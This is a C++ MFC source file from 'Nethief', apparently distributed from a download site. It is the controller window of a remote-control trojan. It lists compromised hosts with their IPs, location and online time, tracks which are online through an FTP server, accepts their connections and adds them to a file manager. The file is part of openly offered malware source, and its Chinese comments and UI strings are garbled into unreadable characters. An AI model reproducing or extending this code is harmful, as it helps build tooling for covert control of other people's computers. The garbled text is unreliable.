//Download by http://www.NewXing.com
// MyFormView.cpp : implementation file
//

#include "stdafx.h"
#include "Nethief.h"
#include "MyFormView.h"

#include "NethiefDoc.h"
#include "RemarkDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyFormView

IMPLEMENT_DYNCREATE(CMyFormView, CFormView)

CMyFormView::CMyFormView()
	: CFormView(CMyFormView::IDD)
{
	//{{AFX_DATA_INIT(CMyFormView)
	//}}AFX_DATA_INIT
	m_strClipBoard="";

	m_pIsOnlineThread=NULL;
	m_pConnectFtpServerThread=NULL;
	m_pKeepFtpSessionThread=NULL;
	m_pGetCallboardTextThread=NULL;
	m_pRecvNotifyThread=NULL;
	m_pAcceptTcpConnectThread=NULL;
	m_pListRefreshThread=NULL;
	m_pRefreshChatroomThread=NULL;
}

CMyFormView::~CMyFormView()
{

}

void CMyFormView::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyFormView)
	DDX_Control(pDX, IDC_STATIC_CHATROOM, m_LinkStatic_Chatroom);
	DDX_Control(pDX, IDC_EDIT_CALLBOARD, m_Edit_Callboard);
	DDX_Control(pDX, IDC_STATIC_ONLINENUM, m_Static_OnlineNum);
	DDX_Control(pDX, IDC_STATIC_POSITION, m_Static_Position);
	DDX_Control(pDX, IDC_STATIC_HOSTNAME, m_Static_HostName);
	DDX_Control(pDX, IDC_STATIC_IPADDRESS, m_Static_IPAddress);
	DDX_Control(pDX, IDC_LIST1, m_List);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyFormView, CFormView)
	//{{AFX_MSG_MAP(CMyFormView)
	ON_WM_TIMER()
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_LIST1, OnColumnclickList1)
	ON_WM_DESTROY()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST1, OnDblclkList1)
	ON_MESSAGE(WM_SOCKET,OnSocket)
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, OnRclickList1)
	ON_COMMAND(ID_POPUPMENU_COPY, OnPopupmenuCopy)
	ON_WM_CTLCOLOR()
	ON_WM_SETCURSOR()
	ON_COMMAND(ID_POPUPMENU_ADD, OnPopupmenuAdd)
	ON_COMMAND(ID_POPUPMENU_REMARK, OnPopupmenuRemark)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyFormView diagnostics

#ifdef _DEBUG
void CMyFormView::AssertValid() const
{
	CFormView::AssertValid();
}

void CMyFormView::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMyFormView message handlers

void CMyFormView::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_pDoc=(CNethiefDoc*)GetDocument();
	m_pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;

	m_hCursorHand=AfxGetApp()->LoadCursor(IDC_CURSOR_HAND);

	m_ImageList.Create(16,16,ILC_COLOR8|ILC_MASK,2,1);
	m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_REMOTEHOST));
	m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_REMOTEHOST_HTTPTUNNEL));
	m_List.SetImageList(&m_ImageList,LVSIL_SMALL);//���ù���ӳ���б�

	m_List.InsertColumn(0,"������",LVCFMT_LEFT,112);
	m_List.InsertColumn(1,"��������IP��ַ",LVCFMT_LEFT,102);
	m_List.InsertColumn(2,"��������IP��ַ",LVCFMT_LEFT,102);
	m_List.InsertColumn(3,"����λ��",LVCFMT_LEFT,159);
	m_List.InsertColumn(4,"����ʱ��",LVCFMT_CENTER,78);
	m_List.InsertColumn(5,"����ʱ��",LVCFMT_CENTER,60);
	m_List.InsertColumn(6,"��ע",LVCFMT_LEFT,98);

	DWORD dwExtendedSytle=m_List.GetExtendedStyle();
	dwExtendedSytle|=LVS_EX_GRIDLINES;
	m_List.SetExtendedStyle(dwExtendedSytle);
	//���ļ���ȡ����˱�ע///////////
	CString exeFullPath;      //���ڱ��浱ǰִ�г���·��
	GetModuleFileName(NULL,   //�õ�·��
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('\\')+1);  //�ҵ�
	exeFullPath.ReleaseBuffer();

	CString strHostRemarkFilename=exeFullPath+"HostRemark.dat";//����������ע���ļ���
	CString strHostName;//������
	CString strHostRemark;//������ע

	CStdioFile File(strHostRemarkFilename,
		CFile::modeRead|CFile::shareDenyNone|CFile::typeText);
	while(File.ReadString(strHostName))//��������
	{
		File.ReadString(strHostRemark);//��������ע

		m_HostRemarkMap.SetAt(strHostName,strHostRemark);//���뵽ӳ��
	}
	File.Close();
	///////////////////////////////////////////////
	SetTimer(1,1000,NULL);//IsOnline
	SetTimer(4,1000,NULL);//GetCallboardText
	OnTimer(7);
	SetTimer(7,60000,NULL);//RefreshChatroom
}

void CMyFormView::OnTimer(UINT nIDEvent)
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent==1)//IsOnline
	{
		if(!m_pCommunity->m_bIsRegistered)//���ûע���ʺžͷ���
			return;
		/////////////////////////////////////////////
		if(m_pIsOnlineThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pIsOnlineThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
				return;
		}
		/////////////////////////////////////////////
		pONLINE_THREAD_PARAM pstOnline=new ONLINE_THREAD_PARAM;
		pstOnline->pCommunity=m_pCommunity;
		pstOnline->pDoc=m_pDoc;
		pstOnline->pWnd=CWnd::FromHandle(m_hWnd);

		m_pIsOnlineThread=AfxBeginThread(IsOnlineProc,(LPVOID)pstOnline);
		m_pIsOnlineThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==2)//ConnectFtpServer
	{
		if(m_pConnectFtpServerThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pConnectFtpServerThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
				return;
		}
		/////////////////////////////////////////////
		pCONN_FTP_THREAD_PARAM pstConnFtp=new CONN_FTP_THREAD_PARAM;
		pstConnFtp->pCommunity=m_pCommunity;
		pstConnFtp->pStatic_HostName=&m_Static_HostName;
		pstConnFtp->pStatic_IPAddress=&m_Static_IPAddress;
		pstConnFtp->pStatic_Position=&m_Static_Position;
		pstConnFtp->pStatic_OnlineNum=&m_Static_OnlineNum;
		pstConnFtp->pDoc=m_pDoc;
		pstConnFtp->pWnd=CWnd::FromHandle(m_hWnd);

		m_pConnectFtpServerThread=AfxBeginThread(ConnectFtpServerProc,(LPVOID)pstConnFtp);
		m_pConnectFtpServerThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==3)//KeepFtpSession
	{
		if(m_pKeepFtpSessionThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pKeepFtpSessionThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
				return;
		}
		/////////////////////////////////////////////
		pKEEP_FTP_SESSION_THREAD_PARAM pstDownload=new KEEP_FTP_SESSION_THREAD_PARAM;
		pstDownload->pCommunity=m_pCommunity;
		pstDownload->pDoc=m_pDoc;
		pstDownload->pWnd=CWnd::FromHandle(m_hWnd);

		m_pKeepFtpSessionThread=AfxBeginThread(KeepFtpSessionProc,(LPVOID)pstDownload);
		m_pKeepFtpSessionThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==4)//GetCallboardText
	{
		if(m_pGetCallboardTextThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pGetCallboardTextThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
				return;
		}
		/////////////////////////////////////////////
		pCALLBOARD_THREAD_PARAM pstCallboard=new CALLBOARD_THREAD_PARAM;
		pstCallboard->pCommunity=m_pCommunity;
		pstCallboard->pWnd=CWnd::FromHandle(m_hWnd);
		pstCallboard->pEdit_Callboard=&m_Edit_Callboard;

		m_pGetCallboardTextThread=AfxBeginThread(GetCallboardTextProc,(LPVOID)pstCallboard);
		m_pGetCallboardTextThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==5)//ListRefresh
	{
		if(m_pListRefreshThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pListRefreshThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
				return;
		}
		/////////////////////////////////////////////
		pLIST_REFRESH_THREAD_PARAM pstListRefresh=new LIST_REFRESH_THREAD_PARAM;
		pstListRefresh->pCommunity=m_pCommunity;
		pstListRefresh->pDoc=m_pDoc;
		pstListRefresh->pStatic_OnlineNum=&m_Static_OnlineNum;
		pstListRefresh->pList=&m_List;
		
		m_pListRefreshThread=AfxBeginThread(ListRefreshProc,(LPVOID)pstListRefresh);
		m_pListRefreshThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==6)//Flash icon
	{
		m_pDoc->FlashIcon();
		return;
	}
	if(nIDEvent==7)//RefreshChatroom
	{
		if(m_pRefreshChatroomThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pRefreshChatroomThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//����߳�û�����ͷ���
				return;
		}
		/////////////////////////////////////////////
		pCHATROOM_THREAD_PARAM pstRefreshChatroom=new CHATROOM_THREAD_PARAM;
		pstRefreshChatroom->pCommunity=m_pCommunity;
		pstRefreshChatroom->pLinkStatic_Chatroom=&m_LinkStatic_Chatroom;
		
		m_pRefreshChatroomThread=AfxBeginThread(RefreshChatroomProc,(LPVOID)pstRefreshChatroom);
		m_pRefreshChatroomThread->m_bAutoDelete=FALSE;
		return;
	}
}

UINT IsOnlineProc(LPVOID pParam)
{
	pONLINE_THREAD_PARAM pstOnline=(pONLINE_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstOnline->pCommunity;
	CNethiefDoc*	pDoc=pstOnline->pDoc;
	CMyFormView*	pWnd=(CMyFormView*)pstOnline->pWnd;
	delete pParam;
	//////////////////////////////////////////////
#if ONLINE_TEST
	if(pCommunity->IsOnline())
#endif
	{
		pDoc->m_bLogoning=TRUE;
		pDoc->SetOfflineSign();
		pWnd->KillTimer(1);//Kill IsOnline
		pWnd->SetTimer(2,1000,NULL);//ConnectFtpServer
		pWnd->SetTimer(6,200,NULL);//Flash icon
	}
	return 0;
}

UINT ConnectFtpServerProc(LPVOID pParam)
{
	pCONN_FTP_THREAD_PARAM pstConnFtp=(pCONN_FTP_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstConnFtp->pCommunity;
	CStatic*		pStatic_HostName=pstConnFtp->pStatic_HostName;
	CStatic*		pStatic_IPAddress=pstConnFtp->pStatic_IPAddress;
	CStatic*		pStatic_Position=pstConnFtp->pStatic_Position;
	CStatic*		pStatic_OnlineNum=pstConnFtp->pStatic_OnlineNum;
	CNethiefDoc*	pDoc=pstConnFtp->pDoc;
	CMyFormView*	pWnd=(CMyFormView*)pstConnFtp->pWnd;
	delete pParam;
	//////////////////////////////////////////////
	int nRet=pCommunity->ConnectFtpServer(pWnd);
	switch(nRet)
	{
		case 0:
		{
			pDoc->m_bLogoning=FALSE;
			pDoc->SetOfflineSign();
			pWnd->KillTimer(2);//Kill ConnectFtpServer
			pWnd->KillTimer(6);//Kill Flash icon
			pWnd->SetTimer(1,1000,NULL);//IsOnline
			break;
		}
		case 3:
		{
			PlaySound(MAKEINTRESOURCE(IDR_ONLINE),
				AfxGetInstanceHandle(),SND_RESOURCE|SND_ASYNC);
			pStatic_HostName->SetWindowText(pCommunity->m_strHostName);
			pStatic_IPAddress->SetWindowText(pCommunity->m_strIPAddr);
			pStatic_Position->SetWindowText(pCommunity->m_strPosition);
			CString strOnlineNum;
			strOnlineNum.Format("%d",pCommunity->m_nOnlineNum);
			pStatic_OnlineNum->SetWindowText(strOnlineNum);
			pDoc->m_strServerNum="(��������: "+strOnlineNum+")";
			pDoc->m_bIsOnline=TRUE;
			pDoc->m_bLogoning=FALSE;
			pDoc->SetOfflineSign();
			pWnd->KillTimer(2);//Kill ConnectFtpServer
			pWnd->KillTimer(6);//Kill Flash icon
			pWnd->SetTimer(3,60000,NULL);//KeepFtpSession
			pWnd->OnTimer(5);
			pWnd->SetTimer(5,60000,NULL);//ListRefresh
			break;
		}
	}
	return 0;
}

UINT KeepFtpSessionProc(LPVOID pParam)
{
	pKEEP_FTP_SESSION_THREAD_PARAM pstDownload=(pKEEP_FTP_SESSION_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstDownload->pCommunity;
	CNethiefDoc*	pDoc=pstDownload->pDoc;
	CMyFormView*	pWnd=(CMyFormView*)pstDownload->pWnd;
	delete pParam;
	//////////////////////////////////////////////
	if(!pCommunity->KeepFtpSession())
	{
		pDoc->m_bIsOnline=FALSE;
		pDoc->SetOfflineSign();
		pWnd->KillTimer(3);//Kill KeepFtpSession
		pWnd->KillTimer(5);//Kill ListRefresh
		pWnd->SetTimer(1,1000,NULL);//IsOnline
	}
	return 0;
}

UINT GetCallboardTextProc(LPVOID pParam)
{
	pCALLBOARD_THREAD_PARAM pstCallboard=(pCALLBOARD_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstCallboard->pCommunity;
	CEdit*			pEdit_Callboard=pstCallboard->pEdit_Callboard;
	CMyFormView*	pWnd=(CMyFormView*)pstCallboard->pWnd;
	delete pParam;
	//////////////////////////////////////////////
	if(pCommunity->GetCallboardText(pEdit_Callboard))
	{
		pWnd->KillTimer(4);//Kill GetCallboardText
	}
	return 0;
}

UINT RecvNotifyProc(LPVOID pParam)
{
	pRECV_NOTIFY_THREAD_PARAM pstRecvNotify=(pRECV_NOTIFY_THREAD_PARAM)pParam;
	CCommunity*			pCommunity=pstRecvNotify->pCommunity;
	CStatic*			pStatic_OnlineNum=pstRecvNotify->pStatic_OnlineNum;
	CNethiefDoc*		pDoc=pstRecvNotify->pDoc;
	CListCtrl*			pList=pstRecvNotify->pList;
	SOCKET				hSocket=pstRecvNotify->hSocket;
	CMapStringToString*	pHostRemarkMap=pstRecvNotify->pHostRemarkMap;
	delete pParam;
	//////////////////////////////////////////////
	if(pCommunity->RecvNotify(hSocket,pList,pHostRemarkMap))
	{
		CString strOnlineNum;
		strOnlineNum.Format("%d",pCommunity->m_nOnlineNum);
		pStatic_OnlineNum->SetWindowText(strOnlineNum);
		pDoc->m_strServerNum="(��������: "+strOnlineNum+")";
		pDoc->SetOfflineSign();
	}
	return 0;
}

UINT AcceptTcpConnectProc(LPVOID pParam)
{
	pACCEPT_CONNECT_THREAD_PARAM pstAcceptConnect=(pACCEPT_CONNECT_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstAcceptConnect->pCommunity;
	CMyFormView*	pWnd=(CMyFormView*)pstAcceptConnect->pWnd;
	delete pParam;
	//////////////////////////////////////////////
	pCommunity->AcceptTcpConnect(pWnd);
	return 0;
}

UINT ListRefreshProc(LPVOID pParam)
{
	pLIST_REFRESH_THREAD_PARAM pstListRefresh=(pLIST_REFRESH_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstListRefresh->pCommunity;
	CStatic*		pStatic_OnlineNum=pstListRefresh->pStatic_OnlineNum;
	CNethiefDoc*	pDoc=pstListRefresh->pDoc;
	CListCtrl*		pList=pstListRefresh->pList;
	delete pParam;
	//////////////////////////////////////////////
	if(pCommunity->ListRefresh(pList))
	{
		CString strOnlineNum;
		strOnlineNum.Format("%d",pCommunity->m_nOnlineNum);
		pStatic_OnlineNum->SetWindowText(strOnlineNum);
		pDoc->m_strServerNum="(��������: "+strOnlineNum+")";
		pDoc->SetOfflineSign();
	}
	return 0;
}

UINT RefreshChatroomProc(LPVOID pParam)
{
	pCHATROOM_THREAD_PARAM pstRefreshChatroom=(pCHATROOM_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstRefreshChatroom->pCommunity;
	CLinkStatic*	pLinkStatic_Chatroom=pstRefreshChatroom->pLinkStatic_Chatroom;
	delete pParam;
	//////////////////////////////////////////////
	int nChatroomNum=pCommunity->RefreshChatroom();
	if(nChatroomNum!=-1)//����-1Ϊʧ��
	{
		CString strText;
		strText.Format("[��������͵������������ %d ��]",nChatroomNum);
		pLinkStatic_Chatroom->SetWindowText(strText);
	}
	return 0;
}
//////////////////////////////////////////////////////////////////////
void CMyFormView::OnColumnclickList1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	m_pCommunity->SortItems(&m_List,pNMListView->iSubItem);

	*pResult = 0;
}

void CMyFormView::OnDestroy()
{
	//�������˱�ע���ļ�/////////////////
	CString exeFullPath;      //���ڱ��浱ǰִ�г���·��
	GetModuleFileName(NULL,   //�õ�·��
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('\\')+1);  //�ҵ�
	exeFullPath.ReleaseBuffer();

	CString strHostRemarkFilename=exeFullPath+"HostRemark.dat";//����������ע���ļ���
	CString strHostName;//������
	CString strHostRemark;//������ע

	CStdioFile File(strHostRemarkFilename,
		CFile::modeCreate|CFile::modeWrite|CFile::shareDenyNone|CFile::typeText);

	POSITION Pos=m_HostRemarkMap.GetStartPosition();
	while(Pos!=NULL)
	{
		m_HostRemarkMap.GetNextAssoc(Pos,strHostName,strHostRemark);//��ӳ�����

		File.WriteString(strHostName+"\n");//д������
		File.WriteString(strHostRemark+"\n");//д������ע
	}
	File.Close();
	///////////////////////////////////////
	if(m_pIsOnlineThread!=NULL)
		TerminateThread(m_pIsOnlineThread->m_hThread,0);
	if(m_pConnectFtpServerThread!=NULL)
		TerminateThread(m_pConnectFtpServerThread->m_hThread,0);
	if(m_pKeepFtpSessionThread!=NULL)
		TerminateThread(m_pKeepFtpSessionThread->m_hThread,0);
	if(m_pGetCallboardTextThread!=NULL)
		TerminateThread(m_pGetCallboardTextThread->m_hThread,0);
	if(m_pRecvNotifyThread!=NULL)
		TerminateThread(m_pRecvNotifyThread->m_hThread,0);
	if(m_pAcceptTcpConnectThread!=NULL)
		TerminateThread(m_pAcceptTcpConnectThread->m_hThread,0);
	if(m_pListRefreshThread!=NULL)
		TerminateThread(m_pListRefreshThread->m_hThread,0);
	if(m_pRefreshChatroomThread!=NULL)
		TerminateThread(m_pRefreshChatroomThread->m_hThread,0);

	CFormView::OnDestroy();
}

void CMyFormView::OnDblclkList1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	int nDblclkItem=pNMListView->iItem;//�õ�˫�������
	if(nDblclkItem!=-1)//��������б�����˫��
	{
		OnPopupmenuAdd();
	}	
}

//***********************************************************************//
void CMyFormView::OnSocket(WPARAM wParam,LPARAM lParam)
{
	SOCKET hSocket=wParam;	//�����¼���Socket���
	DWORD dwEvent=lParam;	//Socket�¼�
	switch(dwEvent)
	{
		case FD_READ:
		{
			pRECV_NOTIFY_THREAD_PARAM pstRecvNotify=new RECV_NOTIFY_THREAD_PARAM;
			pstRecvNotify->pCommunity=m_pCommunity;
			pstRecvNotify->pDoc=m_pDoc;
			pstRecvNotify->pStatic_OnlineNum=&m_Static_OnlineNum;
			pstRecvNotify->pList=&m_List;
			pstRecvNotify->hSocket=hSocket;
			pstRecvNotify->pHostRemarkMap=&m_HostRemarkMap;

			m_pRecvNotifyThread=AfxBeginThread(RecvNotifyProc,(LPVOID)pstRecvNotify);
			break;
		}
		case FD_ACCEPT:
		{
			pACCEPT_CONNECT_THREAD_PARAM pstAcceptConnect=new ACCEPT_CONNECT_THREAD_PARAM;
			pstAcceptConnect->pCommunity=m_pCommunity;
			pstAcceptConnect->pWnd=CWnd::FromHandle(m_hWnd);

			m_pAcceptTcpConnectThread=AfxBeginThread(AcceptTcpConnectProc,(LPVOID)pstAcceptConnect);
			break;
		}
	}	
}

//����������б�����Ҽ��˵�����////////////////////////////////////////
void CMyFormView::OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	CMenu menu;		//����Popup�˵�
	menu.LoadMenu(IDR_POPUPMENU);
	CMenu* pPopup=menu.GetSubMenu(0);
	////////////////////////////////////////
	BOOL bNoSelect=FALSE;
	if(m_List.GetSelectedCount()==0)//�Ƿ���ѡ������
		bNoSelect=TRUE;

	LVHITTESTINFO lvhti;
	lvhti.pt=pNMListView->ptAction;
	m_List.SubItemHitTest(&lvhti);
	if(lvhti.flags&LVHT_ONITEMLABEL)
	{
		if(bNoSelect)//δѡ������
		{
			pPopup->EnableMenuItem(ID_POPUPMENU_ADD,MF_BYCOMMAND|MF_GRAYED);
			pPopup->EnableMenuItem(ID_POPUPMENU_REMARK,MF_BYCOMMAND|MF_GRAYED);
		}
		m_strClipBoard=m_List.GetItemText(lvhti.iItem,lvhti.iSubItem);
	}
	else
	{
		pPopup->EnableMenuItem(ID_POPUPMENU_ADD,MF_BYCOMMAND|MF_GRAYED);
		pPopup->EnableMenuItem(ID_POPUPMENU_REMARK,MF_BYCOMMAND|MF_GRAYED);
		pPopup->EnableMenuItem(ID_POPUPMENU_COPY,MF_BYCOMMAND|MF_GRAYED);
	}
	////////////////////////////////////////
	CPoint Point;
	GetCursorPos(&Point);
	pPopup->TrackPopupMenu(TPM_LEFTALIGN,
		Point.x,Point.y,this,NULL);

	*pResult = 0;
}

void CMyFormView::OnPopupmenuAdd()//�������
{
	// TODO: Add your command handler code here
	BeginWaitCursor();
	int nSelectItem=-1;
	while(1)
	{
		nSelectItem=m_List.GetNextItem(nSelectItem,LVNI_SELECTED);
		if(nSelectItem==-1)
			break;
		///////////////////////////////////////////////////////
		CString strItemName=m_List.GetItemText(nSelectItem,0);

		LV_ITEM Item;
		ZeroMemory(&Item,sizeof(Item));
		Item.mask=LVIF_IMAGE;
		Item.iItem=nSelectItem;
		m_List.GetItem(&Item);

		if(m_pDoc->FindHost(strItemName,Item.iImage))
		{
			if(MessageBox("�ļ����������Ѱ������������ ["+strItemName+"]���Ƿ����ظ���ӣ�","�������"
				,MB_ICONQUESTION|MB_YESNO)==IDNO)
				continue;
		}
		m_pDoc->AddHost(strItemName,Item.iImage);
	}
	EndWaitCursor();
}

void CMyFormView::OnPopupmenuRemark()//�޸ı�ע
{
	// TODO: Add your command handler code here
	int nSelectItem=-1;
	nSelectItem=m_List.GetNextItem(nSelectItem,LVNI_SELECTED);
	if(nSelectItem==-1)//���û��ѡ��,�ͷ���
		return;
	///////////////////////////////////////////////////////
	CString strHostName=m_List.GetItemText(nSelectItem,0);//������
	CString strHostRemark=m_List.GetItemText(nSelectItem,6);//������ע

	CRemarkDlg dlg;
	dlg.m_strRemark=strHostRemark;
	if(dlg.DoModal()==IDOK)//��ȷ��
	{
		/////////////////////////////////
		LV_FINDINFO fi;
		fi.flags=LVFI_STRING;
		fi.psz=strHostName;
		nSelectItem=m_List.FindItem(&fi,-1);//���¶�λ�б�����
		/////////////////////////////////
		if(dlg.m_strRemark=="")//�±�עΪ��
		{
			m_HostRemarkMap.RemoveKey(strHostName);//��ӳ����ɾ�����Key
			if(nSelectItem!=-1)//����б��ﻹ���������
				m_List.SetItemText(nSelectItem,6,dlg.m_strRemark);//���±�ע��ʾ
		}
		else
		{
			if(dlg.m_strRemark!=strHostRemark)//��ע�޸���
			{
				m_HostRemarkMap.SetAt(strHostName,dlg.m_strRemark);//����ӳ��
				if(nSelectItem!=-1)//����б��ﻹ���������
					m_List.SetItemText(nSelectItem,6,dlg.m_strRemark);//���±�ע��ʾ
			}
		}
	}
}

void CMyFormView::OnPopupmenuCopy()//����
{
	// TODO: Add your command handler code here
	//���Ƶ�������
	if(AfxGetMainWnd()->OpenClipboard()) 
	{
		EmptyClipboard();
		int i=m_strClipBoard.GetLength()+1;
		HGLOBAL hGlobalMem=GlobalAlloc(GMEM_MOVEABLE|GMEM_DDESHARE,i);
		memcpy((LPSTR)GlobalLock(hGlobalMem),(LPCSTR)m_strClipBoard,i);
		GlobalUnlock(hGlobalMem);
		if(!SetClipboardData(CF_TEXT,hGlobalMem)) 
			GlobalFree(hGlobalMem);
		CloseClipboard();
	}
}
////////////////////////////////////////////////////////////////////////

HBRUSH CMyFormView::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	HBRUSH hbr = CFormView::OnCtlColor(pDC, pWnd, nCtlColor);
	
	// TODO: Change any attributes of the DC here
	if(IDC_STATIC_CHATROOM==pWnd->GetDlgCtrlID())
	{
		//�����ַ���ɫ
		pDC->SetTextColor(RGB(0,0,255));//��ɫ
	}
	// TODO: Return a different brush if the default is not desired
	return hbr;
}

BOOL CMyFormView::OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message) 
{
	// TODO: Add your message handler code here and/or call default
	if(IDC_STATIC_CHATROOM==pWnd->GetDlgCtrlID())
	{
		SetCursor(m_hCursorHand);
		return TRUE;
	}	
	return CFormView::OnSetCursor(pWnd, nHitTest, message);
}
